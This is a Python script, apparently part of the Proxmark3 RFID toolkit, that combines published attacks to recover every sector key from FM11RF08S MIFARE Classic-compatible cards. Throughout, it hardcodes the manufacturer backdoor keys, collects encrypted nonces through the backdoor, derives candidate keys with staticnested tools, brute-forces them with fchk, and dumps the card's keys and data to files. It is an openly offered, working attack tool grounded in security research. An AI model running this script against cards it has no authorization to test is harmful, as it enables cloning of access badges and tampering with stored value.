#!/usr/bin/env python3
"""
Combine several attacks to recover all FM11RF08S keys.

Conditions:
* Presence of the backdoor with known key

Duration strongly depends on some key being reused and where.
Examples:
* 32 random keys: ~20 min
* 16 random keys with keyA==keyB in each sector: ~30 min
* 24 random keys, some reused across sectors: <1 min

Doegox, 2024, cf https://eprint.iacr.org/2024/1275 for more info
"""

import os
import sys
import time
import subprocess
import argparse
import json
import re
import pm3
from pm3_resources import find_tool, find_dict

# optional color support
try:
    # pip install ansicolors
    from colors import color
except ModuleNotFoundError:
    def color(s, fg=None):
        """Return the string as such, without color."""
        _ = fg
        return str(s)

required_version = (3, 8)
if sys.version_info < required_version:
    print(f"Python version: {sys.version}")
    print(f"The script needs at least Python v{required_version[0]}.{required_version[1]}. Abort.")
    exit()

# First try FM11RF08S key
# Then FM11RF08 key as some rare *98 cards are using it too
# Then FM11RF32N key, just in case...
BACKDOOR_KEYS = ["A396EFA4E24F", "A31667A8CEC1", "518B3354E760"]

NUM_SECTORS = 16
NUM_EXTRA_SECTORS = 1
DEFAULT_KEYS = set()

staticnested_1nt_path = find_tool("staticnested_1nt")
staticnested_2x1nt_path = find_tool("staticnested_2x1nt_rf08s")
staticnested_2x1nt1key_path = find_tool("staticnested_2x1nt_rf08s_1key")


def match_key(line):
    """
    Extract a 12-character hexadecimal key from a given string.

    Args:
        line (str): The input string to search for the hexadecimal key.

    Returns:
        str or None: The 12-character hexadecimal key in uppercase if found, otherwise None.
    """
    match = re.search(r'([0-9a-fA-F]{12})', line)
    if match:
        return match.group(1).upper()
    else:
        return None


def recovery(init_check=False, final_check=False, keep=False, no_oob=False,
             debug=False, supply_chain=False, quiet=True, keyset=[]):
    """
    Perform recovery operation for FM11RF08S cards.

    Args:
        init_check (bool): If True, check for default keys initially.
        final_check (bool): If True, perform a final check and dump keys.
        keep (bool): If True, keep the generated dictionaries after processing.
        no_oob (bool): If True, do not include out-of-bounds sectors.
        debug (bool): If True, print debug information.
        supply_chain (bool): If True, use supply-chain attack data.
        quiet (bool): If True, suppress output messages.
        keyset (list): A list of key pairs to use for the recovery process.

    Returns:
        dict: A dictionary containing the following keys:
            - 'keyfile': Path to the generated binary key file.
            - 'found_keys': List of found keys for each sector.
            - 'dump_file': Path to the generated dump file.
            - 'data': List of data blocks for each sector.
    """
    def show(s='', prompt="[" + color("=", fg="yellow") + "] ", **kwargs):
        if not quiet:
            s = f"{prompt}" + f"\n{prompt}".join(s.split('\n'))
            print(s, **kwargs)

    start_time = time.time()
    p = pm3.pm3()

    p.console("hf 14a read")
    uid = None

    for line in p.grabbed_output.split('\n'):
        if "UID:" in line:
            uid = int(line[10:].replace(' ', '')[-8:], 16)

    if uid is None:
        show("Card not found")
        return False
    show("UID: " + color(f"{uid:08X}", fg="green"))

    def show_key(sec, key_type, key):
        kt = ['A', 'B'][key_type]
        show(f"Sector {sec:2} key{kt} = " + color(key, fg="green"))

    p.console("prefs show --json")
    prefs = json.loads(p.grabbed_output)
    save_path = prefs['file.default.dumppath'] + os.path.sep

    found_keys = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]

    if len(keyset) > 0:
        n = min(len(found_keys), len(keyset))
        show(f"{n} Key pairs supplied: ")
        for i in range(n):
            found_keys[i] = keyset[i]
            show(f"  Sector {i:2d} : A = {found_keys[i][0]:12s}   B = {found_keys[i][1]:12s}")

    if init_check:
        show("Checking default keys...")
        p.console("hf mf fchk")
        for line in p.grabbed_output.split('\n'):
            if "[+]  0" in line:
                res = [x.strip() for x in line.split('|')]
                sec = int(res[0][4:])
                if res[3] == '1':
                    found_keys[sec][0] = res[2]
                    show_key(sec, 0, found_keys[sec][0])
                if res[5] == '1':
                    found_keys[sec][1] = res[4]
                    show_key(sec, 1, found_keys[sec][1])

    show("Getting nonces...")
    nonces_with_data = ""
    for key in BACKDOOR_KEYS:
        cmd = f"hf mf isen --collect_fm11rf08s_with_data --key {key}"
        p.console(cmd)
        for line in p.grabbed_output.split('\n'):
            if "Wrong" in line or "error" in line:
                break
            matched = "Saved to json file "
            if matched in line:
                nonces_with_data = line[line.index(matched)+len(matched):]
        if nonces_with_data != "":
            break

    if (nonces_with_data == ""):
        show("Error getting nonces, abort.")
        return False

    try:
        with open(nonces_with_data, 'r') as file:
            # Load and parse the JSON data
            dict_nwd = json.load(file)
    except json.decoder.JSONDecodeError:
        show(f"Error parsing {nonces_with_data}, abort.")
        return False

    nt = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    nt_enc = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    par_err = [["", ""] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    data = ["" for _ in range(NUM_SECTORS * 4)]
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
        real_sec = sec
        if sec >= NUM_SECTORS:
            real_sec += 16
        nt[sec][0] = dict_nwd["nt"][f"{real_sec}"]["a"].lower()
        nt[sec][1] = dict_nwd["nt"][f"{real_sec}"]["b"].lower()
        nt_enc[sec][0] = dict_nwd["nt_enc"][f"{real_sec}"]["a"].lower()
        nt_enc[sec][1] = dict_nwd["nt_enc"][f"{real_sec}"]["b"].lower()
        par_err[sec][0] = dict_nwd["par_err"][f"{real_sec}"]["a"]
        par_err[sec][1] = dict_nwd["par_err"][f"{real_sec}"]["b"]
    for blk in range(NUM_SECTORS * 4):
        data[blk] = dict_nwd["blocks"][f"{blk}"]

    show("Generating first dump file")
    dump_file = f"{save_path}hf-mf-{uid:08X}-dump.bin"
    with (open(dump_file, "wb")) as f:
        for sec in range(NUM_SECTORS):
            for b in range(4):
                d = data[(sec * 4) + b]
                if b == 3:
                    ka = found_keys[sec][0]
                    kb = found_keys[sec][1]
                    if ka == "":
                        ka = "FFFFFFFFFFFF"
                    if kb == "":
                        kb = "FFFFFFFFFFFF"
                    d = ka + d[12:20] + kb
                f.write(bytes.fromhex(d))
    show(f"Data has been dumped to `{dump_file}`")

    elapsed_time1 = time.time() - start_time
    minutes = int(elapsed_time1 // 60)
    seconds = int(elapsed_time1 % 60)
    show("----Step 1: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
         color(f"{seconds:2}", fg="yellow") + " seconds -----------")

    dict_def = "mfc_default_keys.dic"
    try:
        dict_path = find_dict(dict_def)
        with open(dict_path, 'r', encoding='utf-8') as file:
            for line in file:
                if line[0] != '#' and len(line) >= 12:
                    DEFAULT_KEYS.add(line[:12])
        show(f"Loaded {dict_def}")
    except FileNotFoundError:
        show(f"Warning, {dict_def} not found.")
    except Exception as e:
        raise Exception(f"Error loading {dict_def}: {e}")

    dict_dnwd = None
    def_nt = ["" for _ in range(NUM_SECTORS)]
    if supply_chain:
        try:
            default_nonces = f'{save_path}hf-mf-{uid:04X}-default_nonces.json'
            with open(default_nonces, 'r') as file:
                # Load and parse the JSON data
                dict_dnwd = json.load(file)
                for sec in range(NUM_SECTORS):
                    def_nt[sec] = dict_dnwd["nt"][f"{sec}"].lower()
                show(f"Loaded default nonces from {default_nonces}.")
        except FileNotFoundError:
            pass
        except json.decoder.JSONDecodeError:
            show(f"Error parsing {default_nonces}, skipping.")

    show("Running staticnested_1nt & 2x1nt when doable...")
    keys = [[set(), set()] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    all_keys = set()
    duplicates = set()
    # Availability of filtered dicts
    filtered_dicts = [[False, False] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    found_default = [[False, False] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
        real_sec = sec
        if sec >= NUM_SECTORS:
            real_sec += 16
        if found_keys[sec][0] != "" and found_keys[sec][1] != "":
            continue
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] != nt[sec][1]:
            for key_type in [0, 1]:
                cmd = [staticnested_1nt_path, f"{uid:08X}", f"{real_sec}",
                       nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
                if debug:
                    print(' '.join(cmd))
                subprocess.run(cmd, capture_output=True)
            cmd = [staticnested_2x1nt_path,
                   f"keys_{uid:08x}_{real_sec:02}_{nt[sec][0]}.dic", f"keys_{uid:08x}_{real_sec:02}_{nt[sec][1]}.dic"]
            if debug:
                print(' '.join(cmd))
            subprocess.run(cmd, capture_output=True)
            filtered_dicts[sec][key_type] = True
            for key_type in [0, 1]:
                keys_set = set()
                with (open(f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic")) as f:
                    while line := f.readline().rstrip():
                        keys_set.add(line)
                    keys[sec][key_type] = keys_set.copy()
                    duplicates.update(all_keys.intersection(keys_set))
                    all_keys.update(keys_set)
                if dict_dnwd is not None and sec < NUM_SECTORS:
                    # Prioritize keys from supply-chain attack
                    cmd = [staticnested_2x1nt1key_path, def_nt[sec], "FFFFFFFFFFFF",
                           f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic"]
                    if debug:
                        print(' '.join(cmd))
                    result = subprocess.run(cmd, capture_output=True, text=True).stdout
                    keys_def_set = set()
                    for line in result.split('\n'):
                        matched = match_key(line)
                        if matched is not None:
                            keys_def_set.add(matched)
                    keys_set.difference_update(keys_def_set)
                else:
                    # Prioritize default keys
                    keys_def_set = DEFAULT_KEYS.intersection(keys_set)
                keys_set.difference_update(keys_def_set)
                # Prioritize sector 32 keyB starting with 0000
                if real_sec == 32:
                    keyb32cands = set(x for x in keys_set if x.startswith("0000"))
                    keys_def_set.update(keyb32cands)
                    keys_set.difference_update(keyb32cands)
                if len(keys_def_set) > 0:
                    found_default[sec][key_type] = True
                    with (open(f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic", "w")) as f:
                        for k in keys_def_set:
                            f.write(f"{k}\n")
                        for k in keys_set:
                            f.write(f"{k}\n")
        else:  # one key not found or both identical
            if found_keys[sec][0] == "":
                key_type = 0
            else:
                key_type = 1
            cmd = [staticnested_1nt_path, f"{uid:08X}", f"{real_sec}",
                   nt[sec][key_type], nt_enc[sec][key_type], par_err[sec][key_type]]
            if debug:
                print(' '.join(cmd))
            subprocess.run(cmd, capture_output=True)
            keys_set = set()
            with (open(f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic")) as f:
                while line := f.readline().rstrip():
                    keys_set.add(line)
                keys[sec][key_type] = keys_set.copy()
                duplicates.update(all_keys.intersection(keys_set))
                all_keys.update(keys_set)
            if dict_dnwd is not None and sec < NUM_SECTORS:
                # Prioritize keys from supply-chain attack
                cmd = [staticnested_2x1nt1key_path, def_nt[sec], "FFFFFFFFFFFF",
                       f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic"]
                if debug:
                    print(' '.join(cmd))
                result = subprocess.run(cmd, capture_output=True, text=True).stdout
                keys_def_set = set()
                for line in result.split('\n'):
                    matched = match_key(line)
                    if matched is not None:
                        keys_def_set.add(matched)
                keys_set.difference_update(keys_def_set)
            else:
                # Prioritize default keys
                keys_def_set = DEFAULT_KEYS.intersection(keys_set)
            keys_set.difference_update(keys_def_set)
            if len(keys_def_set) > 0:
                found_default[sec][key_type] = True
                with (open(f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic", "w")) as f:
                    for k in keys_def_set:
                        f.write(f"{k}\n")
                    for k in keys_set:
                        f.write(f"{k}\n")

    show("Looking for common keys across sectors...")
    keys_filtered = [[set(), set()] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    for dup in duplicates:
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
            for key_type in [0, 1]:
                if dup in keys[sec][key_type]:
                    keys_filtered[sec][key_type].add(dup)

    # Availability of duplicates dicts
    duplicates_dicts = [[False, False] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    first = True
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
        real_sec = sec
        if sec >= NUM_SECTORS:
            real_sec += 16
        for key_type in [0, 1]:
            if len(keys_filtered[sec][key_type]) > 0:
                if first:
                    show("Saving duplicates dicts...")
                    first = False
                with (open(f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_duplicates.dic", "w")) as f:
                    keys_set = keys_filtered[sec][key_type].copy()
                    keys_def_set = DEFAULT_KEYS.intersection(keys_set)
                    keys_set.difference_update(DEFAULT_KEYS)
                    for k in keys_def_set:
                        f.write(f"{k}\n")
                    for k in keys_set:
                        f.write(f"{k}\n")
                duplicates_dicts[sec][key_type] = True

    show("Computing needed time for attack...")
    candidates = [[0, 0] for _ in range(NUM_SECTORS + NUM_EXTRA_SECTORS)]
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
        real_sec = sec
        if sec >= NUM_SECTORS:
            real_sec += 16
        for key_type in [0, 1]:
            if found_keys[sec][0] == "" and found_keys[sec][1] == "" and duplicates_dicts[sec][key_type]:
                kt = ['a', 'b'][key_type]
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_duplicates.dic"
                with open(dic, 'r') as file:
                    count = sum(1 for _ in file)
    #            print(f"dic {dic} size {count}")
                candidates[sec][key_type] = count
                if nt[sec][0] == nt[sec][1]:
                    candidates[sec][key_type ^ 1] = 1
        for key_type in [0, 1]:
            if ((found_keys[sec][0] == "" and found_keys[sec][1] == "" and
                 filtered_dicts[sec][key_type] and candidates[sec][0] == 0 and
                 candidates[sec][1] == 0)):
                if found_default[sec][key_type]:
                    # We assume the default key is correct
                    candidates[sec][key_type] = 1
                else:
                    kt = ['a', 'b'][key_type]
                    dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic"
                    with open(dic, 'r') as file:
                        count = sum(1 for _ in file)
    #                print(f"dic {dic} size {count}")
                    candidates[sec][key_type] = count
        if ((found_keys[sec][0] == "" and found_keys[sec][1] == "" and
             nt[sec][0] == nt[sec][1] and candidates[sec][0] == 0 and
             candidates[sec][1] == 0)):
            if found_default[sec][0]:
                # We assume the default key is correct
                candidates[sec][0] = 1
                candidates[sec][1] = 1
            else:
                key_type = 0
                kt = ['a', 'b'][key_type]
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic"
                with open(dic, 'r') as file:
                    count = sum(1 for _ in file)
    #            print(f"dic {dic} size {count}")
                candidates[sec][0] = count
                candidates[sec][1] = 1

    if debug:
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
            real_sec = sec
            if sec >= NUM_SECTORS:
                real_sec += 16
            show(f" {real_sec:03} | {real_sec*4+3:03} | {candidates[sec][0]:6} | {candidates[sec][1]:6}  ")
    total_candidates = sum(candidates[sec][0] + candidates[sec][1] for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS))

    elapsed_time2 = time.time() - start_time - elapsed_time1
    minutes = int(elapsed_time2 // 60)
    seconds = int(elapsed_time2 % 60)
    show("----Step 2: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
         color(f"{seconds:2}", fg="yellow") + " seconds -----------")

    # fchk: 147 keys/s. Correct key found after 50% of candidates on average
    FCHK_KEYS_S = 147
    foreseen_time = (total_candidates / 2 / FCHK_KEYS_S) + 5
    minutes = int(foreseen_time // 60)
    seconds = int(foreseen_time % 60)
    show("Still about " + color(f"{minutes:2}", fg="yellow") + " minutes " +
         color(f"{seconds:2}", fg="yellow") + " seconds to run...")

    abort = False
    show("Brute-forcing keys... Press any key to interrupt")
    for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
        real_sec = sec
        if sec >= NUM_SECTORS:
            real_sec += 16
        for key_type in [0, 1]:
            # If we have a duplicates dict
            # note: we skip if we already know one key
            # as using 2x1nt1key later will be faster
            if found_keys[sec][0] == "" and found_keys[sec][1] == "" and duplicates_dicts[sec][key_type]:
                kt = ['a', 'b'][key_type]
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_duplicates.dic"
                cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} -f {dic} --no-default"
                if debug:
                    print(cmd)
                p.console(cmd)
                for line in p.grabbed_output.split('\n'):
                    if "aborted via keyboard" in line:
                        abort = True
                    matched = match_key(line)
                    if matched is not None:
                        found_keys[sec][key_type] = matched
                        show_key(real_sec, key_type, found_keys[sec][key_type])
                        if nt[sec][0] == nt[sec][1] and found_keys[sec][key_type ^ 1] == "":
                            found_keys[sec][key_type ^ 1] = found_keys[sec][key_type]
                            show_key(real_sec, key_type ^ 1, found_keys[sec][key_type ^ 1])
            if abort:
                break
        if abort:
            break

        for key_type in [0, 1]:
            # If we have a filtered dict
            # note: we skip if we already know one key
            # as using 2x1nt1key later will be faster
            if found_keys[sec][0] == "" and found_keys[sec][1] == "" and filtered_dicts[sec][key_type]:
                # Use filtered dict
                kt = ['a', 'b'][key_type]
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}_filtered.dic"
                cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} -f {dic} --no-default"
                if debug:
                    print(cmd)
                p.console(cmd)
                for line in p.grabbed_output.split('\n'):
                    if "aborted via keyboard" in line:
                        abort = True
                    matched = match_key(line)
                    if matched is not None:
                        found_keys[sec][key_type] = matched
                        show_key(real_sec, key_type, found_keys[sec][key_type])
            if abort:
                break
        if abort:
            break

        # If one common key for the sector
        if found_keys[sec][0] == "" and found_keys[sec][1] == "" and nt[sec][0] == nt[sec][1]:
            key_type = 0
            # Use regular dict
            kt = ['a', 'b'][key_type]
            dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}.dic"
            cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} -f {dic} --no-default"
            if debug:
                print(cmd)
            p.console(cmd)
            for line in p.grabbed_output.split('\n'):
                if "aborted via keyboard" in line:
                    abort = True
                matched = match_key(line)
                if matched is not None:
                    found_keys[sec][0] = matched
                    found_keys[sec][1] = matched
                    show_key(real_sec, 0, found_keys[sec][0])
                    show_key(real_sec, 1, found_keys[sec][1])
        if abort:
            break

        # If one key is missing, use the other one with 2x1nt1key
        if ((found_keys[sec][0] == "") ^ (found_keys[sec][1] == "")) and nt[sec][0] != nt[sec][1]:
            if (found_keys[sec][0] == ""):
                key_type_source = 1
                key_type_target = 0
            else:
                key_type_source = 0
                key_type_target = 1
            if duplicates_dicts[sec][key_type_target]:
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type_target]}_duplicates.dic"
            elif filtered_dicts[sec][key_type_target]:
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type_target]}_filtered.dic"
            else:
                dic = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type_target]}.dic"
            cmd = [staticnested_2x1nt1key_path, nt[sec][key_type_source], found_keys[sec][key_type_source], dic]
            if debug:
                print(' '.join(cmd))
            result = subprocess.run(cmd, capture_output=True, text=True).stdout
            keys = set()
            for line in result.split('\n'):
                matched = match_key(line)
                if matched is not None:
                    keys.add(matched)
            if len(keys) > 1:
                kt = ['a', 'b'][key_type_target]
                cmd = f"hf mf fchk --blk {real_sec * 4} -{kt} --no-default"
                for k in keys:
                    cmd += f" -k {k}"
                if debug:
                    print(cmd)
                p.console(cmd)
                for line in p.grabbed_output.split('\n'):
                    if "aborted via keyboard" in line:
                        abort = True
                    matched = match_key(line)
                    if matched is not None:
                        found_keys[sec][key_type_target] = matched
            elif len(keys) == 1:
                found_keys[sec][key_type_target] = keys.pop()
            if found_keys[sec][key_type_target] != "":
                show_key(real_sec, key_type_target, found_keys[sec][key_type_target])
        if abort:
            break

    if abort:
        show("Brute-forcing phase aborted via keyboard!")
        final_check = False

    plus = "[" + color("+", fg="green") + "] "
    if final_check:
        show("Letting fchk do a final dump, just for confirmation and display...")
        keys_set = set([i for sl in found_keys for i in sl if i != ""])
        with (open(f"keys_{uid:08x}.dic", "w")) as f:
            for k in keys_set:
                f.write(f"{k}\n")
        cmd = f"hf mf fchk -f keys_{uid:08x}.dic --no-default --dump"
        if debug:
            print(cmd)
        p.console(cmd, capture=True, quiet=False)
        for line in p.grabbed_output.split('\n'):
            if "Found keys have been dumped to" in line:
                keyfile = line[line.index("`"):].strip("`")
    else:
        show()
        show(color("found keys:", fg="green"), prompt=plus)
        show(prompt=plus)
        show("-----+-----+--------------+---+--------------+----", prompt=plus)
        show(" Sec | Blk | key A        |res| key B        |res", prompt=plus)
        show("-----+-----+--------------+---+--------------+----", prompt=plus)
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
            real_sec = sec
            if sec >= NUM_SECTORS:
                real_sec += 16
            keys = [["", 0], ["", 0]]
            for key_type in [0, 1]:
                if found_keys[sec][key_type] == "":
                    keys[key_type] = [color("------------", fg="red"), color("0", fg="red")]
                else:
                    keys[key_type] = [color(found_keys[sec][key_type], fg="green"), color("1", fg="green")]
            show(f" {real_sec:03} | {real_sec*4+3:03} | " +
                 f"{keys[0][0]} | {keys[0][1]} | {keys[1][0]} | {keys[1][1]} ", prompt=plus)
        show("-----+-----+--------------+---+--------------+----", prompt=plus)
        show("( " + color("0", fg="red") + ":Failed / " +
             color("1", fg="green") + ":Success )", prompt=plus)
        show()
        show("Generating binary key file", prompt=plus)
        keyfile = f"{save_path}hf-mf-{uid:08X}-key.bin"
        unknown = False
        with (open(keyfile, "wb")) as f:
            for key_type in [0, 1]:
                for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS * (1 - int(no_oob))):
                    k = found_keys[sec][key_type]
                    if k == "":
                        k = "FFFFFFFFFFFF"
                        unknown = True
                    f.write(bytes.fromhex(k))
        show("Found keys have been dumped to `" + color(keyfile, fg="yellow")+"`", prompt=plus)
        if unknown:
            show("  --[ " + color("FFFFFFFFFFFF", fg="yellow") +
                 " ]-- has been inserted for unknown keys", prompt="[" + color("=", fg="yellow") + "]")
    show("Generating final dump file", prompt=plus)
    dump_file = f"{save_path}hf-mf-{uid:08X}-dump.bin"
    with (open(dump_file, "wb")) as f:
        for sec in range(NUM_SECTORS):
            for b in range(4):
                d = data[(sec * 4) + b]
                if b == 3:
                    ka = found_keys[sec][0]
                    kb = found_keys[sec][1]
                    if ka == "":
                        ka = "FFFFFFFFFFFF"
                    if kb == "":
                        kb = "FFFFFFFFFFFF"
                    d = ka + d[12:20] + kb
                f.write(bytes.fromhex(d))
    show("Data has been dumped to `" + color(dump_file, fg="yellow")+"`", prompt=plus)

    # Remove generated dictionaries after processing
    if not keep:
        show("Removing generated dictionaries...", prompt=plus)
        for sec in range(NUM_SECTORS + NUM_EXTRA_SECTORS):
            real_sec = sec
            if sec >= NUM_SECTORS:
                real_sec += 16
            for key_type in [0, 1]:
                for append in ["", "_filtered", "_duplicates"]:
                    file_name = f"keys_{uid:08x}_{real_sec:02}_{nt[sec][key_type]}{append}.dic"
                    if os.path.isfile(file_name):
                        os.remove(file_name)

    elapsed_time3 = time.time() - start_time - elapsed_time1 - elapsed_time2
    minutes = int(elapsed_time3 // 60)
    seconds = int(elapsed_time3 % 60)
    show("----Step 3: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
         color(f"{seconds:2}", fg="yellow") + " seconds -----------")

    elapsed_time = time.time() - start_time
    minutes = int(elapsed_time // 60)
    seconds = int(elapsed_time % 60)
    show("---- TOTAL: " + color(f"{minutes:2}", fg="yellow") + " minutes " +
         color(f"{seconds:2}", fg="yellow") + " seconds -----------")
    return {'keyfile': keyfile, 'found_keys': found_keys, 'dump_file': dump_file, 'data': data}


def main():
    """
    Parse command-line arguments and initiate the recovery process.

    Command-line arguments:
    -x, --init-check: Run an initial fchk for default keys.
    -y, --final-check: Run a final fchk with the found keys.
    -n, --no-oob: Do not save out of bounds keys.
    -k, --keep: Keep generated dictionaries after processing.
    -d, --debug: Enable debug mode.
    -s, --supply-chain: Enable supply-chain mode. Look for hf-mf-XXXXXXXX-default_nonces.json.

    The supply-chain mode json can be produced from the json saved by
    "hf mf isen --collect_fm11rf08s --key A396EFA4E24F" on a wiped card, then processed with
    jq '{Created: .Created, FileType: "fm11rf08s_default_nonces", nt: .nt | del(.["32"]) | map_values(.a)}'.

    This function calls the recovery function with the parsed arguments.
    """
    parser = argparse.ArgumentParser(description='A script combining staticnested* tools '
                                     'to recover all keys from a FM11RF08S card.')
    parser.add_argument('-x', '--init-check', action='store_true', help='Run an initial fchk for default keys')
    parser.add_argument('-y', '--final-check', action='store_true', help='Run a final fchk with the found keys')
    parser.add_argument('-n', '--no-oob', action='store_true', help='Do not save out of bounds keys')
    parser.add_argument('-k', '--keep', action='store_true', help='Keep generated dictionaries after processing')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('-s', '--supply-chain', action='store_true', help='Enable supply-chain mode. '
                        'Look for hf-mf-XXXXXXXX-default_nonces.json')
    # Such json can be produced from the json saved by
    # "hf mf isen --collect_fm11rf08s --key A396EFA4E24F" on a wiped card, then processed with
    # jq '{Created: .Created, FileType: "fm11rf08s_default_nonces", nt: .nt | del(.["32"]) | map_values(.a)}'
    args = parser.parse_args()

    recovery(
        init_check=args.init_check,
        final_check=args.final_check,
        keep=args.keep,
        no_oob=args.no_oob,
        debug=args.debug,
        supply_chain=args.supply_chain,
        quiet=False
    )


if __name__ == '__main__':
    main()
